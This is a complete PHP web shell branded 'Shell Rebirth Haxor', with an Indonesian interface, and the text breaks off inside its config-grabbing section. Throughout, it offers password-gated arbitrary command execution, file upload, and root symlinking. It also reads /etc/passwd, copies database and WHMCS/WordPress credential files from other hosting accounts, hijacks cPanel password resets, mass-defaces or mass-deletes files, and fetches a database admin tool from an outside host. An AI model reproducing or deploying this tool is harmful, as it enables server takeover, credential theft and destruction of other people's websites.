<?php
error_reporting(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();
$passwd = ".";
if($_POST['pass']) {
  if($_POST['passwd'] == $passwd) {
    $_SESSION['masuk'] = "masuk";
    header("Location: ?");
  }
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  header("Location: ?");
}
if(empty($_SESSION['masuk'])) {
?>
<title>LOGIN &#9829;</title>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<meta name="bingbot" content="noindex, nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link rel="icon" type="image/png" href="https://data.whicdn.com/images/317122168/original.jpg">
<style>
  html {
    background: #202020;
    color: deeppink;
  }
  input {
    background: transparent;
    color: crimson;
    border: 1px solid teal;
  }
  @media only screen and (max-width:800px){
     html{
        font-size:20px;
     }
  }
</style>
<center>
<font color=aqua> .: <font color=lime>Welcome To My Shell <font color=aqua> :.
<table height="100%" width="100%">
  <td align="center">
    <br><br>
    <form enctype="multipart/form-data" method="post">
      <input type="password" name="passwd">
      <input type="submit" name="pass" value="&#9829;">
    </form>
  </td>
</table>
<?php
exit();
}
?>
<title>.: h a x o r &#9829; :.</title>
<meta name="google" content="notranslate">
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<meta name="bingbot" content="noindex, nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<link href="https://fonts.googleapis.com/css2?family=Iceberg&display=swap" rel="stylesheet">
<link rel="icon" type="image/png" href="https://data.whicdn.com/images/317122168/original.jpg">
<style>
html {
    background: #202020;
  }
  html {
    font-size:13px;
    color: red;
    font-family:Iceberg;
  }
  input,select {
    background: transparent;
    color: teal;
    border: 1px solid red;
  }
  a {
    text-decoration: underline;
    color: deeppink;
  }
  .file {
    width: 100%;
    height: 50%;
    background:url("https://i.ibb.co/WWW7Fg2/hannaku.jpg");
    background-position:bottom;
    background-repeat:no-repeat;
    background-attachment:fixed;
    background-size:1000px;
    color: green;
  }
  .cmnd {
    background-color:#39DE99;
    text-decoration: none;
    color:#569FE0;
  }
  .shell {
    width: 100%;
    height: 20%;
    background: transparent;
    border:3px solid green;
    color: aqua;
  }
  hr{
     border:1px solid #EB5476;
  }
  .c {
    background: black;
    color: red;
    padding: 10px;
    border:1px solid green;
  }
  td {
    padding: 10px;
    border:1px solid #EB5476;
  }
  .a-bar {
    text-decoration: none;
    color: red;
  }
  .bar {
    display: inline;
    padding: 5px;
    background: #202020;
    color: purple;
  }
  .abu {
    background: black;
    color: lime;
  }
  .mass{
     width: 450px; 
     height: 200px; 
     background:transparent;
     border:1px solid red;
     color:teal;
  }
  .massd{
     width: 450px;
     height:20;
  }
  .massg{
     width: 450px;
  }
  .jumpc{
     width: 500px;
     height: 250px;
  }
  .jumpi{
     width: 500px;
     height: 25px;
  }
  @media only screen and (max-width:500px){
     html{
        font-size:12px;
     }
     h1{
        font-size:20px;
     }
     .file{
        background-position:bottom;
        background-size:400px;
     }
     .massd{
        width:350px;
     }
     .mass{
        width:350px;
     }
     .massg{
        width:350px;
     }
     .jumpi{
        width:350px;
     }
     .jumpc{
        width:350px;
     }
  }
</style>
<center>
<hr>
  <font color=red><b><h1>dihanha<font color=white>xor1337<h1></h1>
<p>
 <a href="https://wa.me/6282235703400">Whatsapp</a><font color=green> |  <a href="http://github.com/beruangsalju">Github</a></p>


<hr>
</center>
<b><font color=teal>.: <font color=yellow>SHELL <font color=aquamarine> REBIRTH HAXOR <font color=yellow> FIRST EDITION 2020 <font color=purple>[ <font color=white>Coded B<font color=aqua>y Omest <font color=purple>] <font color=teal> :.</b>
<br><br>
	<font color=lime>
<?php
$soft =  $_SERVER['SERVER_SOFTWARE'];
$os = PHP_OS;
echo "Server IP : ".gethostbyname($_SERVER['HTTP_HOST'])."<br>";
echo "Kernel : ".php_uname()."<br>";
echo "Software : ".$soft."<br>";
echo "OS : ".$os."<br>";
?>
<hr>
<?php
function w($dir_raw,$perm) {
	if(!is_writable($dir_raw)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function r($dir_raw,$perm) {
	if(!is_readable($dir_raw)) {
		return "<font color=red>".$perm."</font>";
	} else {
		return "<font color=lime>".$perm."</font>";
	}
}
function perms($sdir){
	$perms = fileperms($sdir);
	if (($perms & 0xC000) == 0xC000) {
	// Socket
	$info = 's';
	} elseif (($perms & 0xA000) == 0xA000) {
	// Symbolic Link
	$info = 'l';
	} elseif (($perms & 0x8000) == 0x8000) {
	// Regular
	$info = '-';
	} elseif (($perms & 0x6000) == 0x6000) {
	// Block special
	$info = 'b';
	} elseif (($perms & 0x4000) == 0x4000) {
	// Directory
	$info = 'd';
	} elseif (($perms & 0x2000) == 0x2000) {
	// Character special
	$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
	// FIFO pipe
	$info = 'p';
	} else {
	// Unknown
	$info = 'u';
	}
		// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));
	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}
$dir_raw = str_replace('\\', "/", getcwd());
$host = $_SERVER['HTTP_HOST'];
if($dn = $_GET['d']) {
  $_SESSION['dir'] = $dn;
  echo "<script>window.location = '?';</script>";
}
if(empty($_SESSION['dir'])) {
  $dir = $dir_raw;
} else {
  $dir = $_SESSION['dir'];
}
$exp = explode("/", $dir);
foreach($exp as $x=>$dirx) {
  if(empty($dirx)){
    continue;
  }
  $do .= "<li class='bar'><a class='a-bar' href='?d=";
  for($i=0;$i<=$x;$i++) {
    $do .= $exp[$i]."/";
  }
  $do .= "'>$dirx</a></li>\n";
}
chdir($dir);
?>
<?php
echo "LOKASI : $do
<hr>
<center>
";
?>
<form enctype="multipart/form-data" method="post">
  <input type="file" name="dihan">
  <input type="submit" value="&#9829;">
</form>
<?php
if($_FILES['dihan']) {
  if(copy($_FILES['dihan']['tmp_name'], $_FILES['dihan']['name'])) {
    echo "<br>".$_FILES[dihan][name]."Berhasil Upload :)";
  } else {
    echo "<br>Gagal Upload".$_FILES[dihan][name].":(";
  }
}
?>
<hr>
[ <a href="?d=<?php echo dirname(__FILE__); ?>">PULANG RUMAH</a> ] 
[ <a href="?symlink=true">SYMLINK</a> ]
[ <a href="?jump=true">LOMPAT</a> ] 
[ <a href="?config=true">GRAB KONFIG</a> ] 
</br>
[ <a href="?adminer=true">ADMINER</a> ]
[ <a href="?mass=true">MASS DEFDEL</a> ] 
[ <a href="?rcpanel=true">AUTO RESS CPANEL</a> ]
[ <a href="?logout">KELUAR</a> ]
<hr>
</center>
<form enctype="multipart/form-data" method="post">
  Shell@<?php echo $_SERVER['HTTP_HOST'].":".$dir." $ "; ?><input class="cmnd" type="text" name="shell"><input type="submit" value="&#9829;">
</form>
<textarea class="shell">
<?php echo htmlspecialchars(shell_exec($_POST['shell'])); ?>
</textarea>
<center>
<hr>
<?php
if($_GET['symlink'] == "true") {
 if(!is_dir("dihan_sym")) {
    mkdir("dihan_sym");
  }
  if(!symlink("/", "dihan_sym/root")) {
      echo "<b>.: SYMLINK :.</b>";
  }
  $hta="Options Indexes FollowSymLinks\nDirectoryIndex defacer\nAddType txt .php\nAddHandler txt .php\n";
  $htaccess=fopen("dihan_sym/.htaccess", "w");
  fwrite($htaccess, $hta);
  fclose($htaccess);
  echo "<b></b><br><br>";
  $symlink = file_get_contents("/etc/passwd");
  $lined=explode("\n", $symlink);
  echo "<table height='100%'>";
  echo "<tr><td class='putih'>User</td><td class='putih'>Symlink</td></tr>";
  foreach($lined as $line_x) {
    if(empty($line_x)) {
      continue;
    }
    $user_x = explode(":", $line_x);
    echo "<tr><td>$user_x[0]</td><td><font color='red'><a href='dihan_sym/root/home/$user_x[0]'>Symlink</a></font></td>";
  }
  echo "</table>";
}
elseif($_GET["jump"] == "true"){
   $i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" class="jumpc">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" class="jmupi">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" class="jumpc">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" class="jumpi">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_dihan_jump) {
					$user_jumping_dir = "/home/$user_dihan_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_dihan_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}
elseif($_GET["rcpanel"] == "true"){
   echo '<center><font size=5><header> 
<pre> 
.: AUTO RESET PASSWORD CPANEL :. </pre> 
</header> 
</center>
<font size=5><center>
<form action="#" method="post"> 	 <input type="email" name="email" placeholder="email" /> 	 <input type="submit" name="submit" value="&#9829;"/> 	 
</form> 	 	 
<br/><br/><br/> 
</p>'; ?> 
<?php 
$IIIIIIIIIIII = get_current_user(); 
$IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; 
$IIIIIIIIIIlI = getenv('REMOTE_ADDR'); 
if (isset($_POST['submit'])) { 
$email = $_POST['email']; 
$IIIIIIIIIIl1 = 'email:' . $email; 
$IIIIIIIIII1I = fopen('/home/' . 
$IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); 
fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); 
fclose($IIIIIIIIII1I); 
$IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); 
fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); 
fclose($IIIIIIIIII1I); 
$IIIIIIIIIlIl = "https://"; 
$IIIIIIIIIlI1 = "2083"; 
$IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; 
$read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); 
if(!$read_named_conf) { 
echo "<h1><i>gak bisa di akses Onne-Chan</i></h1>
<br><br> 
</pre>
</center>"; 
} 
else {
   echo "<center>Ini User Namenya Salin Lalu Gass <br><br>
</center>"; 
echo '<center>
<input type="text" value="' . $IIIIIIIIIIII . '" id="user">
<button onclick="username()">Salin User</button>
</center>
<script>function username() { 
var copyText = document.getElementById("user"); 
copyText.select();
document.execCommand("copy");
} 
</script> '; 
echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass Disini</a><br><br></center></font>'; ;
  }
 }
}
elseif($_GET["mass"] == "true"){
   echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$dihan = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$dihan = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea class='shell' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"massd\" name=\"mass\" >
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' class='massd'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='index.php' class='massd'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' class='mass'>Tusbol Aku Mass</textarea><br>
		<input type='submit' name='start' value='Mass Deface' class='massg'>
		</form></center>";
		}
}
elseif($_GET["adminer"] == "true"){
   $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.txt')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>.: ADMINER LOGIN :.</a></font></center>";
	} else {
		if(adminer("https://www.bijnesbhai.com/css/adminer.txt","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}
elseif($_GET["config"] == "true"){
   echo '<form method="post">
   <center><textarea cols="66" name="passwd" class="shell" rows="18">';
$uSr=file("/etc/passwd"); 
foreach($uSr as $usrr) 
{ 
$str=explode(":",$usrr); 
echo $str[0]."\n"; 
}
echo system('ls /var/mail');
echo system('ls /home');

echo'</textarea><br>
Home : 
<select name="home">
<option title="home" value="home">home</option>
<option title="home1" value="home1">home1</option>
<option title="home2" value="home2">home2</option>
<option title="home3" value="home3">home3</option>
<option title="home4" value="home4">home4</option>
<option title="home5" value="home5">home5</option>
<option title="home6" value="home6">home6</option>
<option title="home7" value="home7">home7</option>
<option title="home8" value="home8">home8</option> 
<option title="home9" value="home9">home9</option>
<option title="home10" value="home10">home10</option> 
</select><br>
.htaccess : 
<select name="ecchiexploit">
<option title="biasa" value="Options Indexes FollowSymLinks
DirectoryIndex ecchiexploit.bhi
AddType txt .php
AddHandler txt .php">Apache 1</option>
<option title="Apache" value="Options all
Options +Indexes 
Options +FollowSymLinks 
DirectoryIndex ecchiexploit.bhi
AddType text/plain .php
AddHandler server-parsed .php
AddType text/plain .html
AddHandler txt .html
Require None
Satisfy Any">Apache 2</option>
<option title="Litespeed" value=" 
Options +FollowSymLinks
DirectoryIndex ecchiexploit.bhi
RemoveHandler .php
AddType application/octet-stream .php ">Litespeed</option>
</select>
<input style="color:red;background-color:#FFFF" name="conf" type="submit" size="10" value="&#9829;">
<br/><br/></form>';
if ($_POST['conf']) {
$home = $_POST['home'];
$folfig = $home;
@mkdir($folfig, 0755); 
@chdir($folfig);
$htaccess = $_POST['ecchiexploit'];
file_put_contents(".htaccess",$htaccess,FILE_APPEND);
$passwd=explode("\n",$_POST["passwd"]); 
foreach($passwd as $pwd){ $user=trim($pwd);
symlink('/','hanna_love');
copy('/'.$home.'/'.$user.'/.my.cnf',$user.'  CPANEL');
symlink('/'.$home.'/'.$user.'/.my.cnf',$user.'  CPANEL');
copy('/'.$home.'/'.$user.'/.accesshash',$user.'WHMCS.txt');
symlink('/'.$home.'/'.$user.'/.accesshash',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.'  RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/suspended.page/index.html',$user.'  RESELLER.txt');
symlink('/'.$home.'/'.$user.'/public_html/.accesshash',$user.'WHMCS.txt');
copy('/'.$home.'/'.$user.'/public_html/wp-config.php',$user.'WORDPRESS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/configuration.php',$user.'  WHMCS or JOOMLA.txt');
copy('/'.$home.'/'.$user.'/public_html/account/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/accounts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/buy/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/checkout/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/central/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clienti/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/cliente/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientes/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientarea/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientsarea/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-area/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clients-area/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/clientzone/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/client-zone/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/core/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/company/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customer/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/customers/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/bill/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/billing/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/finance/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/financeiro/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/host/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hosting/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/hostings/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/klien/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manage/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/manager/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/member/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/members/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccount/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-account/client/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/myaccounts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/my-accounts/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/order/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/orders/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/painel/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panel/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/panels/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portal/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/portals/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/purchase/configuration.php',$user.'WHMCS.txt'); 

copy('/'.$home.'/'.$user.'/public_html/secure/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/support/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supporte/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/supports/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/web/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhost/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/webhosting/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whm/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/whmcs2/configuration.php',$user.'WHMCS.txt'); 
copy('/'.$home.'/'.$user.'/public_html/Whm/configuration.php',$user.'WHMCS.txt'); 
